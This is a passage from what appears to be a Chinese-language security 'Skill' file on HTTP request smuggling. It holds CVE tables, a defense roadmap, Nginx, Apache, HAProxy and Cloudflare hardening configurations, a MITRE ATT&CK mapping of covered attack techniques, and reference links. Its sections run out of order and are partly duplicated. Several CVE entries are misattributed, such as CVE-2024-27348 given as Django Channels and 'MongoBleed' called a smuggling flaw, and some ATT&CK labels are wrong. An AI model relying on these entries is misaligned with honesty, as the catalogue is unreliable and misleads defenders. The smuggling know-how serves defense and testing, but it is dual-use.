│ CVE-2025-54142   │ 2025 │ Akamai Ghost          │ OPTIONS+Body走私              │ 高危     │
│ CVE-2025-66373   │ 2025 │ Akamai Ghost          │ 无效chunked body size走私     │ 高危     │
│ CVE-2025-32094   │ 2025 │ Akamai                │ HTTP请求走私                  │ 高危     │
│ CVE-2025-4366    │ 2025 │ Cloudflare Pingora    │ 请求头操纵走私                │ 高危     │
│ CVE-2025-1974    │ 2025 │ K8s Ingress-NGINX     │ IngressNightmare未授权RCE     │ Critical │
│ CVE-2025-59822   │ 2025 │ http4s (Scala)        │ HTTP Trailer走私              │ 中危     │
│ CVE-2025-58068   │ 2025 │ Gunicorn (Python)     │ HTTP请求走私                  │ 高危     │
│ CVE-2026-2833    │ 2026 │ Cloudflare Pingora    │ H1连接升级走私                │ 高危     │
│ CVE-2026-2835    │ 2026 │ Cloudflare Pingora    │ H1.x请求走私(CVSS 9.3)       │ Critical │
│ GHSA-355h        │ 2025 │ Eclipse Jetty         │ Chunk扩展引号字符串走私       │ 高危     │
│ CVE-2023-44487   │ 2023 │ HTTP/2 多厂商         │ Rapid Reset DoS               │ 高危     │
│ CVE-2023-25690   │ 2023 │ Apache HTTP Server    │ H2 mod_proxy走私              │ 高危     │
│ CVE-2024-34351   │ 2024 │ Next.js               │ Host头走私SSRF               │ 高危     │
└──────────────────┴──────┴───────────────────────┴──────────────────────────────┴─────────┘

注：2025年成为 HTTP 请求走私 CVE 爆发年，核心原因是 chunk extension 解析差异
    和 bare LF 宽松性问题被系统性研究（"Funky Chunks"）
```

### 14. 中文社区精华

```
┌────────────────────────────────────────────────────────────────────────────┐
│ 奇安信技术研究院 (2025年1月)                                              │
│ 《WSGI中的请求走私问题研究》                                              │
│ 内容：Python/WSGI生态的 CL/TE 处理不当场景、Gunicorn/uWSGI 利用方式       │
│ 链接：https://research.qianxin.com/archives/date/2025/01                 │
├────────────────────────────────────────────────────────────────────────────┤
│ 阿里云安全漏洞库 (AVD)                                                    │
│ CVE-2025-22871 (Go net/http 裸LF走私)                                    │
│ CVE-2025-59822 (http4S Trailer走私)                                      │
│ 链接：https://avd.aliyun.com/detail?id=AVD-2025-22871                    │
├────────────────────────────────────────────────────────────────────────────┤
│ 知乎专栏                                                                  │
│ 《Web请求走私攻击技术详解》                                                │
│ 内容：完整的 CL.TE/TE.CL/TE.TE 原理讲解与实战案例                         │
│ 链接：https://zhuanlan.zhihu.com/p/676409818                             │
├────────────────────────────────────────────────────────────────────────────┤
│ Emile Fugulin (Medium)                                                    │
│ 《HTTP Desync Attacks with Python and AWS》                               │
│ 内容：Python WSGI + AWS ALB 架构下的实战走私研究                          │
│ 链接：https://medium.com/@emilefugulin/http-desync-attacks-with-         │
│       python-and-aws-1ba07d2c860f                                         │
└────────────────────────────────────────────────────────────────────────────┘
```

### 15. 防御升级路线图

```
2025-2026 请求走私防御优先级（按影响排序）：

[P0 - 立即] Chunk Extension 解析加固
  │ 所有后端服务器必须拒绝包含 chunk-extension 的请求
  │ 或前后端使用完全一致的 chunk-extension 解析逻辑
  │ Nginx: proxy_set_header Transfer-Encoding ""（移除TE，统一用CL）
  │
[P0 - 立即] Bare LF 拒绝
  │ 所有 HTTP 解析器必须拒绝 bare LF (\n) 作为行终止符
  │ 仅接受 CRLF (\r\n)，与 RFC 7230 严格一致
  │ Go: 升级到 1.24.2+ / 1.23.8+
  │ ASP.NET Core: 升级到最新补丁版本
  │ Netty: 升级到 4.1.124.Final+
  │
[P1 - 本月] OPTIONS/TRACE Body 处理
  │ 前端代理应剥离 OPTIONS/TRACE 等非 body 方法的 entity body
  │ 或直接拒绝带 body 的 OPTIONS 请求
  │
[P1 - 本月] WSGI 服务器升级
  │ Gunicorn: 升级到最新版本（含 CVE-2025-58068 修复）
  │ 确保 gevent >= 24.10.1
  │
[P2 - 季度] HTTP/2 端到端部署
  │ 前端 CDN → 后端应用全程 HTTP/2
  │ 消除 H2→H1 降级面
  │
[P2 - 季度] K8s Ingress 安全加固
  │ Ingress-NGINX 升级到最新版本（含 CVE-2025-1974 修复）
  │ 限制 Admission Controller 网络访问
  │ 启用 Pod 网络策略
  │
[P3 - 持续] 监控与检测
  │ 部署 Sigma 规则检测 CL/TE 冲突
  │ 监控异常 chunk extension 模式
  │ 检测 bare LF 在 HTTP 流量中的出现
  │ 跟踪 Cloudflare/Akamai CDN 安全公告
```

### 9-orig. 历史 CVE 列表（已整合至 §13 扩展版）

```
┌──────────────────┬──────┬───────────────────────┬──────────────────────────────┐
│ CVE 编号          │ 年份  │ 影响组件               │ 描述                          │
├──────────────────┼──────┼───────────────────────┼──────────────────────────────┤
│ CVE-2023-44487   │ 2023 │ HTTP/2 协议（多厂商）  │ HTTP/2 Rapid Reset DoS 攻击   │
│ CVE-2023-25690   │ 2023 │ Apache HTTP Server     │ HTTP/2 请求走私（mod_proxy）  │
│ CVE-2023-31130   │ 2023 │ WebSocket++            │ HTTP 请求走私                 │
│ CVE-2023-43653   │ 2023 │ OwnCloud               │ HTTP Host 头走私              │
│ CVE-2023-49195   │ 2023 │ Apache Tomcat          │ HTTP/2 请求走私               │
│ CVE-2024-23721   │ 2024 │ Google V8/h2 库        │ H2 CRLF 注入走私              │
│ CVE-2024-27348   │ 2024 │ Django Channels        │ HTTP 请求解析不一致            │
│ CVE-2024-34351   │ 2024 │ Next.js                │ Host 头走私 SSRF              │
│ CVE-2025-1974    │ 2025 │ Ingress-NGINX (K8s)    │ 请求走私绕过访问控制           │
│ CVE-2025-32094   │ 2025 │ Akamai                 │ HTTP 请求走私                 │
│ CVE-2025-4366    │ 2025 │ Cloudflare Pingora     │ 走私漏洞（请求头操纵）         │
│ CVE-2025-14847   │ 2025 │ MongoDB 相关组件       │ "MongoBleed" 走私漏洞         │
│ CVE-2026-2833    │ 2026 │ Cloudflare Pingora     │ HTTP/1.1 连接升级走私         │
│ CVE-2026-2835    │ 2026 │ Cloudflare Pingora     │ HTTP/1.x 请求走私             │
└──────────────────┴──────┴───────────────────────┴──────────────────────────────┘

注：CVE-2026 系列为最新分配的编号，反映该攻击面的持续活跃
```

### 10. 防御配置（更新版）

#### 10.1 Nginx 防御

```nginx
# ===== Nginx HTTP/2 走私防御 =====

# 1. HTTP/2 端到端部署（避免 H2→H1 降级）
server {
    listen 443 ssl http2;
    # 与后端也使用 HTTP/2 或确保解析一致
}

# 2. 上游代理防御
location / {
    proxy_http_version 1.1;
    
    # 强制移除 Transfer-Encoding，统一使用 CL
    proxy_set_header Transfer-Encoding "";
    
    # 拒绝同时包含 CL 和 TE 的请求
    # 使用 Lua 模块检测
    access_by_lua_block {
        local cl = ngx.req.get_headers()["Content-Length"]
        local te = ngx.req.get_headers()["Transfer-Encoding"]
        if cl and te then
            ngx.exit(400)
        end
    }
}

# 3. 严格 Host 头验证（防御 Host 头走私）
server {
    server_name target.com;
    
    # 默认拒绝未知 Host
    if ($host !~* ^(www\.)?target\.com$) {
        return 444;
    }
}

# 4. 禁用不必要的 HTTP 方法
if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|PATCH)$ ) {
    return 405;
}
```

#### 10.2 Apache 防御

```apache
# ===== Apache HTTP 走私防御 =====

# 1. 拒绝多个 Transfer-Encoding 头
RewriteEngine On
RewriteCond %{HTTP:Transfer-Encoding} ^.*,.+$
RewriteRule .* - [F]

# 2. 移除 Transfer-Encoding（统一使用 CL）
RequestHeader unset Transfer-Encoding

# 3. 拒绝同时存在 CL 和 TE 的请求
<IfModule mod_security2.c>
    SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ." \
        "id:1001,phase:1,deny,status:400,\
        msg:'TE header present',\
        chain"
    SecRule REQUEST_HEADERS:Content-Length "@rx ."
</IfModule>

# 4. mod_proxy 防御（CVE-2023-25690 修复后）
# 确保升级到修复版本
# 在代理配置中验证请求行
ProxyRequests Off
ProxyPreserveHost Off
```

#### 10.3 HAProxy 防御

```
# ===== HAProxy 走私防御 =====

# 1. 拒绝有歧义的请求
frontend http-in
    # 拒绝同时包含 CL 和 TE 的请求
    http-request deny if { req.hdr_cnt(Content-Length) gt 0 } { req.hdr_cnt(Transfer-Encoding) gt 0 }
    
    # 拒绝包含多个 TE 头的请求
    http-request deny if { req.hdr_cnt(Transfer-Encoding) gt 1 }
    
    # 拒绝非标准 TE 值
    http-request deny if { req.hdr(Transfer-Encoding) -m found } !{ req.hdr(Transfer-Encoding) chunked }
    
    # 规范化请求（移除 TE，统一使用 CL）
    http-request replace-header Transfer-Encoding ^.*$ ""

# 2. HTTP/2 降级防御
frontend https-in
    # 强制 HTTP/2 端到端
    # 避免不必要的 H2→H1 降级
    
    # 如果必须降级，验证 H2 头部
    http-request deny if { req.hdr(Content-Length) -m found } !{ req.body_size gt 0 }

# 3. 连接升级控制
    # 拒绝可疑的 h2c 升级
    http-request deny if { req.hdr(Upgrade) -m found } { req.hdr(Upgrade) h2c }
```

#### 10.4 Cloudflare 防御

```
# ===== Cloudflare 走私防御 =====

# Cloudflare 作为 CDN 已内置多层防御：

# 1. WAF 托管规则
# Cloudflare WAF 已部署针对走私的检测规则
# 包括 CL/TE 冲突检测、CRLF 注入检测

# 2. 请求规范化
# Cloudflare 自动规范化请求头
# 移除或覆盖有歧义的头部

# 3. 配置建议
# - 启用 Cloudflare WAF（Pro/Business/Enterprise）
# - 使用 Full (Strict) SSL 模式
# - 配置 Firewall Rules 拒绝畸形请求

# Cloudflare Firewall Rule 示例：
# 拒绝包含可疑 TE 头的请求
# (http.request.headers["transfer-encoding"] contains "chunked" and 
#  http.request.headers["content-length"] ne "")

# 4. Pingora 漏洞修复
# CVE-2025-4366 和 CVE-2026-2833/2835 已修复
# 确保 Cloudflare 账户处于最新版本
# 无需用户端操作（Cloudflare 自动部署修复）
```

#### 10.5 架构层防御原则

```
2025-2026 防御最佳实践：

1. 端到端 HTTP/2
   - 前端 CDN/代理 → 后端应用全程使用 HTTP/2
   - 完全消除 H2→H1 降级导致的走私面
   - 如果必须降级，在降级点严格验证所有头部

2. 请求规范化
   - 前端代理在转发前统一移除 TE 头部
   - 前端代理重新计算 Content-Length
   - 拒绝任何有歧义的头部组合

3. 解析一致性
   - 前后端使用相同的 HTTP 解析库
   - 定期同步解析库版本
   - 使用共享的请求验证中间件

4. 连接隔离
   - 不同用户的请求使用独立连接
   - 限制连接复用范围
   - 对敏感路径（/admin, /api/auth）禁用连接复用

5. 监控与检测
   - 监控异常响应码（用户收到 404/403 但请求正常）
   - 检测响应时间异常（走私导致的超时）
   - 记录前端与后端请求差异
   - 部署 Sigma 规则检测走私指标

6. 供应链安全
   - 关注反向代理、CDN 组件的 CVE 公告
   - 及时更新 HAProxy、Nginx、Apache 等组件
   - 关注 Cloudflare/Akamai 等服务的漏洞修复公告
```

### 11. 更新 MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | CL.TE/TE.CL/H2 走私利用 |
| Credential Access | T1539 | Steal Web Session Cookie | 请求窃取（Cookie/Token） |
| Defense Evasion | T1027 | Obfuscated Files | HPP 参数混淆、TE.TE 混淆 |
| Defense Evasion | T1211 | Exploitation for Defense Evasion | 走私绕过 WAF/访问控制 |
| Defense Evasion | T1090.001 | Internal Proxy: SOCKS Proxy | H2C 代理穿透、请求隧道 |
| Lateral Movement | T1090 | Proxy | 连接复用攻击 |
| Persistence | T1505.003 | Server Software Component: Web Shell | 缓存投毒持久化 |
| Discovery | T1046 | Network Service Discovery | Desync 探测后端架构 |
| Exfiltration | T1567 | Exfiltration Over Web Service | 通过走私通道窃取数据 |
| Impact | T1498 | Network Denial of Service | HTTP/2 Rapid Reset DoS (CVE-2023-44487) |
| Reconnaissance | T1595.001 | Active Scanning: Scanning IP Blocks | 走私漏洞批量检测 |

---

## 参考资源

### 经典参考
- [PortSwigger — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Research — HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [PortSwigger — CL.0 Request Smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0)
- [APNIC Blog — Browser-Powered Desync Attacks](https://blog.apnic.net/2022/10/28/browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling/)
- [Akamai — HTTP/2 Request Smuggling](https://www.akamai.com/blog/security/http-2-request-smuggling)
- [HackTricks — Request Smuggling in HTTP/2 Downgrades](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.html)
- [PayloadsAllTheThings — Request Smuggling](https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/)

### 2025-2026 新增参考
- [Funky Chunks — w4ke (2025年6月)](https://w4ke.info/2025/06/18/funky-chunks.html) — Chunk行终止符宽松性走私研究
- [Imperva — Smuggling with Chunked Extensions](https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/) — Chunk扩展走私新攻击类别
- [Praetorian — CVE-2025-55315 $10K Bug](https://www.praetorian.com/blog/how-i-found-the-worst-asp-net-vulnerability-a-10k-bug-cve-2025-55315/) — ASP.NET Core Kestrel走私发现过程
- [Akamai — CVE-2025-54142 OPTIONS+Body](https://www.akamai.com/blog/security-research/advisory-cve-2025-54142-http-request-smuggling-via-options-body) — OPTIONS请求body走私
- [Akamai — CVE-2025-66373 Chunked Body Size](https://www.akamai.com/blog/security/cve-2025-66373-http-request-smuggling-chunked-body-size) — 无效chunked body size走私
- [Cloudflare — Pingora CVE-2025-4366](https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora/) — Pingora走私修复
- [Kubernetes Blog — CVE-2025-1974 IngressNightmare](https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/) — K8s Ingress-NGINX未授权RCE
- [F5 — Chunk Extension Smuggling CVE-2025-55315](https://community.f5.com/kb/security-insights/http-request-smuggling-using-chunk-extensions-cve-2025-55315/344118) — F5对chunk扩展走私的分析
- [NVD — CVE-2025-22871 Go net/http](https://nvd.nist.gov/vuln/detail/CVE-2025-22871) — Go bare LF走私
- [GitHub Advisory — Jetty GHSA-355h](https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf) — Jetty chunk扩展引号字符串走私
- [Emile Fugulin — HTTP Desync with Python and AWS](https://medium.com/@emilefugulin/http-desync-attacks-with-python-and-aws-1ba07d2c860f) — Python/WSGI实战研究
- [YesWeHack — Ultimate Bug Bounty Guide](https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities) — 综合赏金指南
- [SquidSec — Desync in 2025](https://squidhacker.com/2025/11/http-request-smuggling-in-2025-how-to-distinguish-real-desync-vulnerabilities-from-http-request-pipelining-and-stop-wasting-everyones-time/) — 区分真实desync与pipelining

### 中文参考
- [奇安信技术研究院 — WSGI中的请求走私问题研究 (2025年1月)](https://research.qianxin.com/archives/date/2025/01)
- [阿里云 AVD — CVE-2025-22871 Go net/http 走私](https://avd.aliyun.com/detail?id=AVD-2025-22871)
- [阿里云 AVD — CVE-2025-59822 http4S Trailer走私](https://avd.aliyun.com/detail?id=AVD-2025-59822)
